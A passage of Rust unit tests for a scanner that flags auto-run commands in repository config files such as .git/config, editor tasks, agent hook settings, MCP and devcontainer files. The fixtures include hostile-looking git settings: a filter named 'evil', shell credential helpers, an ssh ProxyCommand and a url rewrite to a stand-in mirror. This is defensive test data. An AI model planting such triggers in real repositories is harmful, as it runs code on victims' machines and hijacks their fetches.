             \tsshCommand = ssh -o ProxyCommand=x\n[remote \"origin\"]\n\turl = https://x.example/r.git\n\
             [filter \"lfs\"]\n\tclean = evil %f\n[credential]\n\thelper = !sh h.sh\n\
             [alias]\n\tco = checkout\n\tx = !sh y.sh\n[include]\n\tpath = ../other\n\
             [url \"https://mirror.example/\"]\n\tinsteadOf = https://github.com/\n",
        );
        assert!(has(&f, "core.fsmonitor", ScriptTrigger::OnGit));
        assert!(has(&f, "core.hookspath", ScriptTrigger::OnGit));
        assert!(has(&f, "core.sshcommand", ScriptTrigger::OnGit));
        assert!(has(&f, "filter.lfs.clean", ScriptTrigger::OnGit));
        assert!(has(&f, "credential.helper", ScriptTrigger::OnGit));
        assert!(has(&f, "alias.co", ScriptTrigger::Manual));
        assert!(has(&f, "alias.x", ScriptTrigger::Manual));
        let s = scripts(&f);
        // Quotes and the trailing comment are read the way git reads them.
        assert!(s.iter().any(|(n, c, _)| n == "core.fsmonitor" && c == "sh x.sh"));
        // `core.hooksPath` is a redirect, not a command: no unfollowed-command fact for it.
        let shell = reasons(&f).iter().filter(|r| **r == UnresolvedReason::ShellCommand).count();
        assert_eq!(shell, s.len() - 2); // minus hooksPath and the plain alias
        // The include and the URL rewrite are flagged, not followed.
        assert_eq!(reasons(&f).iter().filter(|r| **r == UnresolvedReason::UnsupportedSyntax).count(), 2);
    }

    #[test]
    fn git_config_booleans_and_empty_values_run_nothing() {
        let f = run(".git/config", "[core]\n\tfsmonitor = true\n\tfsmonitor\n\teditor =\n[pager]\n\tlog = false\n");
        assert!(f.is_empty());
    }

    #[test]
    fn git_config_syntax_variants_are_read() {
        // Old-style subsection, a key on the header line, a continuation, and escapes.
        let f = run(".git/config", "[filter.x] smudge = a \\\n b\n[core]\n\teditor = \"vi\\\"m\"\n");
        let s = scripts(&f);
        assert!(s.iter().any(|(n, c, _)| n == "filter.x.smudge" && c == "a  b"), "{s:?}");
        assert!(s.iter().any(|(n, c, _)| n == "core.editor" && c == "vi\"m"), "{s:?}");
    }

    #[test]
    fn a_bad_line_in_git_config_is_flagged_and_the_rest_is_still_read() {
        let f = run(".git/config", "[core\n\tfsmonitor = x\n[core]\n\t= nothing\n\tsshCommand = ssh\n");
        assert_eq!(reasons(&f).iter().filter(|r| **r == UnresolvedReason::ParseFailed).count(), 2);
        assert!(has(&f, "core.sshcommand", ScriptTrigger::OnGit));
    }

    #[test]
    fn a_file_that_does_not_parse_says_so_and_keeps_nothing_else() {
        for (p, s) in [
            (".vscode/tasks.json", "{ not json"),
            (".claude/settings.json", ""),
            ("composer.json", "{\"scripts\": }"),
            ("global.json", "/* unterminated"),
        ] {
            let f = run(p, s);
            assert_eq!(reasons(&f), vec![UnresolvedReason::ParseFailed], "{p}");
        }
    }

    #[test]
    fn hostile_shapes_do_not_panic_and_are_not_dropped() {
        let deep = format!("{}{}", "[".repeat(200), "]".repeat(200));
        for (p, s) in [
            (".vscode/tasks.json", "[]"),
            (".vscode/tasks.json", r#"{"tasks":"x"}"#),
            (".vscode/tasks.json", r#"{"tasks":[1,null,{"command":5}]}"#),
            (".claude/settings.json", r#"{"hooks":[]}"#),
            (".claude/settings.json", r#"{"hooks":{"E":"x"}}"#),
            (".claude/settings.json", r#"{"hooks":{"E":[{"hooks":{}}]}}"#),
            (".mcp.json", r#"{"mcpServers":[]}"#),
            (".mcp.json", r#"{"mcpServers":{"a":5}}"#),
            (".devcontainer.json", r#"{"postCreateCommand":{"a":{"b":"c"}},"features":5}"#),
            ("composer.json", r#"{"scripts":{"a":5,"b":[1]}}"#),
            ("global.json", r#"{"msbuild-sdks":[]}"#),
            ("composer.json", deep.as_str()),
        ] {
            let f = run(p, s);
            assert!(!f.is_empty(), "{p} {s}");
        }
    }

    #[test]
    fn ids_stay_unique_when_the_same_command_appears_twice() {
        let f = run(
            ".claude/settings.json",
            r#"{"hooks":{"E":[{"hooks":[{"command":"x"}]},{"hooks":[{"command":"x"}]}]}}"#,
        );
        let mut ids: Vec<String> = f.iter().map(|x| x.id().as_str().to_string()).collect();
        let n = ids.len();
        ids.sort();
        ids.dedup();
        assert_eq!(ids.len(), n);
    }
}
